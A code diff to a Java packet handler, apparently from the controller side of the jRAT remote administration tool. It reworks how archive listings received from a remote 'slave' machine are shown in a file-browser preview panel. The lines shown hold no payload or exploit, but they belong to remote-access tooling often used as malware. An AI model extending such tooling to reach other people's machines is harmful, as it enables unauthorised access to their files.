@@ -1,27 +1,34 @@
 package jrat.module.fs.packets;
 
-import iconlib.FileIconUtils;
-import jrat.common.utils.DataUnits;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.AbstractIncomingPacket;
-import jrat.module.fs.ui.FramePreviewZip;
+import jrat.module.fs.ui.FrameRemoteFiles;
+import jrat.module.fs.ui.previews.FramePreviewZip;
 
-import javax.swing.*;
+import java.util.zip.ZipEntry;
 
 public class Packet45ArchivePreview extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
+	    String path = slave.readLine(); // path to archive file
+
 		boolean dir = slave.readBoolean();
 		String name = slave.readLine();
-		String filesize = DataUnits.getAsString(slave.readLong());
+		long size = slave.readLong();
 
-		FramePreviewZip frame = FramePreviewZip.INSTANCES.get(slave);
+        FrameRemoteFiles panel = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
 
-		if (frame != null) {
-			Icon icon = FileIconUtils.getIconFromExtension(name, dir);
+		if (panel != null) {
 
-			frame.getModel().addRow(new Object[] { icon, name, dir ? "" : filesize });
+			FramePreviewZip preview = (FramePreviewZip) panel.getPreviewHandler(path);
+
+            if (preview != null) {
+                ZipEntry zip = new ZipEntry(name);
+                zip.setSize(size);
+
+                preview.addData(zip);
+            }
 		}
 	}
 
